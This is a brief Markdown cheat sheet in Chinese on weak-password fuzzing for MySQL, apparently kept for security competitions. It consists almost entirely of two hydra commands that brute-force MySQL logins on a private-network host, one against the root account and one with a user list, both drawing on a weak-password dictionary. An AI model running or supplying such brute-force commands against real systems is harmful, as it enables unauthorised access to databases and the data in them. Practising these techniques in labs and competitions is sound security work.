# 弱口令Fuzz

## mysql

```
1.hydra -l root -P /Volumes/windowSSD/比赛工具类/fuzz字典/PasswordDic/weakme.txt -t 2 -e n -f -v 192.168.43.61 mysql

hydra -L ./user.txt -P /Volumes/widowSSD/比赛工具类/fuzz字典/PasswordDic/weakme.txt -t 2 -e n -f -v 192.168.43.61 mysql
```

